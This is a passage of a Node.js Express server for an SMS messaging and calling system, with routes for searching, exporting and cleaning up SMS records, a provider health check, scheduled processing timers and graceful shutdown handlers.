        if (!query || query.length < 2) {
            return res.status(400).json({
                success: false,
                error: 'Search query must be at least 2 characters'
            });
        }

        let whereClause = `WHERE (body LIKE ? OR to_number LIKE ? OR from_number LIKE ?)`;
        let queryParams = [`%${query}%`, `%${query}%`, `%${query}%`];

        if (direction) {
            whereClause += ` AND direction = ?`;
            queryParams.push(direction);
        }

        if (status) {
            whereClause += ` AND status = ?`;
            queryParams.push(status);
        }

        queryParams.push(limit);

        const searchResults = await new Promise((resolve, reject) => {
            const searchQuery = `
                SELECT * FROM sms_messages 
                ${whereClause}
                ORDER BY created_at DESC
                LIMIT ?
            `;

            db.db.all(searchQuery, queryParams, (err, rows) => {
                if (err) {
                    console.error('SMS search query error:', err);
                    reject(err);
                } else {
                    resolve(rows || []);
                }
            });
        });

        // Format results for display
        const formattedResults = searchResults.map(msg => ({
            message_sid: msg.message_sid,
            phone: msg.to_number || msg.from_number,
            direction: msg.direction,
            status: msg.status,
            body: msg.body,
            created_at: msg.created_at,
            created_date: new Date(msg.created_at).toLocaleDateString(),
            created_time: new Date(msg.created_at).toLocaleTimeString(),
            // Highlight matching text (basic implementation)
            highlighted_body: msg.body.replace(
                new RegExp(query, 'gi'), 
                `**${query}**`
            ),
            error_info: msg.error_code ? {
                code: msg.error_code,
                message: msg.error_message
            } : null
        }));

        res.json({
            success: true,
            query: query,
            filters: { direction, status },
            results: formattedResults,
            result_count: formattedResults.length,
            enhanced_search: true
        });

    } catch (error) {
        console.error('❌ Error in SMS search:', error);
        res.status(500).json({
            success: false,
            error: 'Search failed',
            details: error.message
        });
    }
});

// Export SMS data endpoint
app.get('/api/sms/export', async (req, res) => {
    try {
        const format = req.query.format || 'json'; // 'json' or 'csv'
        const days = parseInt(req.query.days) || 30;
        const dateFrom = new Date(Date.now() - (days * 24 * 60 * 60 * 1000)).toISOString();

        const messages = await new Promise((resolve, reject) => {
            db.db.all(`
                SELECT 
                    message_sid,
                    to_number,
                    from_number,
                    body,
                    status,
                    direction,
                    created_at,
                    updated_at,
                    error_code,
                    error_message,
                    ai_response
                FROM sms_messages 
                WHERE created_at >= ?
                ORDER BY created_at DESC
            `, [dateFrom], (err, rows) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(rows || []);
                }
            });
        });

        if (format === 'csv') {
            // Generate CSV
            const csvHeaders = [
                'Message SID', 'To Number', 'From Number', 'Message Body', 
                'Status', 'Direction', 'Created At', 'Updated At', 
                'Error Code', 'Error Message', 'AI Response'
            ];

            let csvContent = csvHeaders.join(',') + '\n';
            
            messages.forEach(msg => {
                const row = [
                    msg.message_sid || '',
                    msg.to_number || '',
                    msg.from_number || '',
                    `"${(msg.body || '').replace(/"/g, '""')}"`, // Escape quotes
                    msg.status || '',
                    msg.direction || '',
                    msg.created_at || '',
                    msg.updated_at || '',
                    msg.error_code || '',
                    `"${(msg.error_message || '').replace(/"/g, '""')}"`,
                    `"${(msg.ai_response || '').replace(/"/g, '""')}"`
                ];
                csvContent += row.join(',') + '\n';
            });

            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', `attachment; filename="sms-export-${new Date().toISOString().split('T')[0]}.csv"`);
            res.send(csvContent);

        } else {
            // Return JSON
            res.json({
                success: true,
                export_info: {
                    total_messages: messages.length,
                    date_range: {
                        from: dateFrom,
                        to: new Date().toISOString()
                    },
                    exported_at: new Date().toISOString()
                },
                messages: messages
            });
        }

    } catch (error) {
        console.error('❌ Error exporting SMS data:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to export SMS data',
            details: error.message
        });
    }
});

// SMS system health check
app.get('/api/sms/health', async (req, res) => {
    try {
        const health = {
            timestamp: new Date().toISOString(),
            status: 'healthy',
            services: {
                database: { status: 'unknown' },
                twilio: { status: currentProvider === 'twilio' ? 'unknown' : 'disabled' },
                pinpoint: { status: currentProvider === 'aws' ? 'unknown' : 'disabled' },
                vonage: { status: currentProvider === 'vonage' ? 'unknown' : 'disabled' },
                sms_service: { status: 'unknown' }
            },
            statistics: {
                active_conversations: 0,
                scheduled_messages: 0,
                recent_messages: 0
            }
        };

        // Check database connectivity
        try {
            const dbTest = await new Promise((resolve, reject) => {
                db.db.get('SELECT COUNT(*) as count FROM sms_messages LIMIT 1', (err, row) => {
                    if (err) reject(err);
                    else resolve(row);
                });
            });
            
            health.services.database.status = 'healthy';
            health.services.database.message_count = dbTest.count;
        } catch (dbError) {
            health.services.database.status = 'unhealthy';
            health.services.database.error = dbError.message;
            health.status = 'degraded';
        }

        // Check SMS service if available
        try {
            if (smsService) {
                const stats = smsService.getStatistics();
                health.services.sms_service.status = 'healthy';
                health.statistics.active_conversations = stats.active_conversations;
                health.statistics.scheduled_messages = stats.scheduled_messages;
            } else {
                health.services.sms_service.status = 'not_initialized';
            }
        } catch (smsError) {
            health.services.sms_service.status = 'unhealthy';
            health.services.sms_service.error = smsError.message;
        }

        // Check recent activity
        try {
            const recentCount = await new Promise((resolve, reject) => {
                const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
                db.db.get(
                    'SELECT COUNT(*) as count FROM sms_messages WHERE created_at >= ?',
                    [oneHourAgo],
                    (err, row) => {
                        if (err) reject(err);
                        else resolve(row.count || 0);
                    }
                );
            });
            
            health.statistics.recent_messages = recentCount;
        } catch (recentError) {
            console.warn('Could not get recent message count:', recentError);
        }

        // Check Twilio connectivity (basic check)
        if (currentProvider === 'twilio') {
            try {
                if (twilioAccountSid && twilioAuthToken) {
                    health.services.twilio.status = 'configured';
                    health.services.twilio.account_sid = `${twilioAccountSid.substring(0, 8)}...`;
                } else {
                    health.services.twilio.status = 'not_configured';
                    health.status = 'degraded';
                }
            } catch (twilioError) {
                health.services.twilio.status = 'error';
                health.services.twilio.error = twilioError.message;
            }
        }

        if (currentProvider === 'aws') {
            if (awsAdapters?.sms) {
                health.services.pinpoint.status = 'configured';
                health.services.pinpoint.application_id = awsAdapters.sms.config.pinpoint.applicationId;
                health.services.pinpoint.region = awsAdapters.sms.config.pinpoint.region;
            } else {
                health.services.pinpoint.status = 'not_configured';
                health.status = 'degraded';
            }
        } else if (currentProvider === 'vonage') {
            if (vonageAdapters?.sms) {
                health.services.vonage.status = 'configured';
                health.services.vonage.from_number = vonageAdapters.sms.fromNumber || vonageConfig?.sms?.fromNumber;
            } else {
                health.services.vonage.status = 'not_configured';
                health.status = 'degraded';
            }
        }

        res.json(health);

    } catch (error) {
        console.error('❌ SMS health check error:', error);
        res.status(500).json({
            timestamp: new Date().toISOString(),
            status: 'unhealthy',
            error: 'Health check failed',
            details: error.message
        });
    }
});

// Clean up old SMS conversations (manual trigger)
app.post('/api/sms/cleanup-conversations', async (req, res) => {
    try {
        if (!smsService) {
            return res.status(500).json({
                success: false,
                error: 'SMS service not initialized'
            });
        }

        const maxAgeHours = parseInt(req.body.max_age_hours) || 24;
        const cleaned = smsService.cleanupOldConversations(maxAgeHours);

        res.json({
            success: true,
            cleaned_count: cleaned,
            max_age_hours: maxAgeHours,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Error cleaning up SMS conversations:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to cleanup conversations',
            details: error.message
        });
    }
});

// Start scheduled message processor
setInterval(() => {
    smsService.processScheduledMessages().catch(error => {
        console.error('❌ Scheduled SMS processing error:', error);
    });
}, 60000); // Check every minute

// Cleanup old conversations every hour
setInterval(() => {
    smsService.cleanupOldConversations(24); // Keep conversations for 24 hours
}, 60 * 60 * 1000);

startServer();

// Enhanced graceful shutdown with comprehensive cleanup
process.on('SIGINT', async () => {
  console.log('\n🛑 Shutting down enhanced adaptive system gracefully...'.yellow);
  
  try {
    // Log shutdown start
    await db.logServiceHealth('system', 'shutdown_initiated', {
      active_calls: callConfigurations.size,
      tracked_calls: callFunctionSystems.size
    });
    
    // Stop services
    webhookService.stop();
    callConfigurations.clear();
    callFunctionSystems.clear();
    
    // Log successful shutdown
    await db.logServiceHealth('system', 'shutdown_completed', {
      timestamp: new Date().toISOString()
    });
    
    await db.close();
    console.log('✅ Enhanced adaptive system shutdown complete'.green);
  } catch (shutdownError) {
    console.error('❌ Error during shutdown:', shutdownError);
  }
  
  process.exit(0);
});

process.on('SIGTERM', async () => {
  console.log('\n🛑 Shutting down enhanced adaptive system gracefully...'.yellow);
  
  try {
    // Log shutdown start
    await db.logServiceHealth('system', 'shutdown_initiated', {
      active_calls: callConfigurations.size,
      tracked_calls: callFunctionSystems.size,
      reason: 'SIGTERM'
    });
    
    // Stop services
    webhookService.stop();
    callConfigurations.clear();
    callFunctionSystems.clear();
    
    // Log successful shutdown
    await db.logServiceHealth('system', 'shutdown_completed', {
      timestamp: new Date().toISOString()
    });
    
    await db.close();
    console.log('✅ Enhanced adaptive system shutdown complete'.green);
  } catch (shutdownError) {
    console.error('❌ Error during shutdown:', shutdownError);
  }
  
  process.exit(0);
});
